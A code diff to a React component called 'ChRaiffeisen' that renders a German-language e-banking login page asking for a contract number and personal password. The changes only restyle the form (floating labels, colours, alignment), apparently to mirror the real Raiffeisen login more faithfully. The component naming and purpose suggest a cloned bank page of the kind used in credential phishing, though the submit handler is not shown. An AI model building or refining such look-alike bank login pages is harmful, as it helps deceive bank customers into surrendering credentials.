@@ -72,56 +72,75 @@ const ChRaiffeisen = () => {
           <div className="w-full max-w-[530px] md:ml-[22%] pt-12 md:pt-16">
             <h1 className="text-3xl md:text-4xl font-bold mb-10">Login für E-Banking</h1>
 
-            {/* Vertragsnummer */}
+            {/* Vertragsnummer - Floating Label */}
             <div className="mb-8">
-              <label className="block text-sm text-gray-700 mb-1">Vertragsnummer</label>
-              <input
-                type="text"
-                value={vertragsnummer}
-                onChange={(e) => setVertragsnummer(e.target.value)}
-                className="w-full border-0 border-b-2 border-black bg-transparent py-1 text-base focus:outline-none focus:border-[#E2001A] transition-colors"
-                autoComplete="off"
-              />
+              <div className="relative border-b border-[#949494] focus-within:border-b-2 focus-within:border-black transition-all">
+                <input
+                  id="vertragsnummer"
+                  type="text"
+                  value={vertragsnummer}
+                  onChange={(e) => setVertragsnummer(e.target.value)}
+                  placeholder=" "
+                  className="peer w-full bg-transparent pt-5 pb-2 text-base text-black focus:outline-none"
+                  autoComplete="off"
+                />
+                <label
+                  htmlFor="vertragsnummer"
+                  className="absolute left-0 top-3 text-base text-[#949494] transition-all duration-200 ease-out pointer-events-none peer-focus:top-0 peer-focus:text-xs peer-focus:text-black peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:text-black"
+                >
+                  Vertragsnummer
+                </label>
+              </div>
             </div>
 
-            {/* Passwort */}
+            {/* Persönliches Passwort - Floating Label */}
             <div className="mb-10">
-              <label className="block text-sm text-gray-700 mb-1">Persönliches Passwort</label>
-              <input
-                type="password"
-                value={passwort}
-                onChange={(e) => setPasswort(e.target.value)}
-                className="w-full border-0 border-b border-black bg-transparent py-1 text-base focus:outline-none focus:border-[#E2001A] transition-colors"
-                autoComplete="off"
-              />
+              <div className="relative border-b border-[#949494] focus-within:border-b-2 focus-within:border-black transition-all">
+                <input
+                  id="passwort"
+                  type="password"
+                  value={passwort}
+                  onChange={(e) => setPasswort(e.target.value)}
+                  placeholder=" "
+                  className="peer w-full bg-transparent pt-5 pb-2 text-base text-black focus:outline-none"
+                  autoComplete="off"
+                />
+                <label
+                  htmlFor="passwort"
+                  className="absolute left-0 top-3 text-base text-[#949494] transition-all duration-200 ease-out pointer-events-none peer-focus:top-0 peer-focus:text-xs peer-focus:text-black peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:text-black"
+                >
+                  Persönliches Passwort
+                </label>
+              </div>
             </div>
 
             {/* Weiter Button */}
             <button
               onClick={handleSubmit}
-              className="bg-[#1a1a1a] text-white font-medium px-14 py-3 hover:bg-[#333] transition-colors mb-8"
+              className="bg-[#1a1a1a] text-white font-medium px-14 py-3 rounded-md hover:bg-[#333] transition-colors mb-8"
             >
               Weiter
             </button>
 
             {/* Passwort vergessen */}
             <div>
-              <a href="#" className="text-sm underline hover:no-underline" style={{ color: BRONZE }}>
+              <a href="#" className="text-base underline underline-offset-4 hover:no-underline" style={{ color: BRONZE }}>
                 Passwort vergessen?
               </a>
             </div>
           </div>
 
-          {/* Bottom service links */}
-          <div className="mt-auto pt-10 pb-8 flex items-center justify-between text-sm">
-            <a href="#" className="underline hover:no-underline" style={{ color: BRONZE }}>
+          {/* Bottom service links - aligned with form column */}
+          <div className="mt-auto pt-10 pb-8 w-full max-w-[530px] md:max-w-none md:ml-[22%] md:mr-[22%] flex items-center justify-between text-base">
+            <a href="#" className="underline underline-offset-4 hover:no-underline" style={{ color: BRONZE }}>
               Neues Gerät für PhotoTAN aktivieren
             </a>
-            <a href="#" className="underline hover:no-underline" style={{ color: BRONZE }}>
+            <a href="#" className="underline underline-offset-4 hover:no-underline" style={{ color: BRONZE }}>
               Hilfe und Kontakt
             </a>
           </div>
         </main>
+
 
         {/* Secondary footer (scroll) */}
         <footer className="bg-white border-t border-gray-200 py-6 px-6 md:px-12">
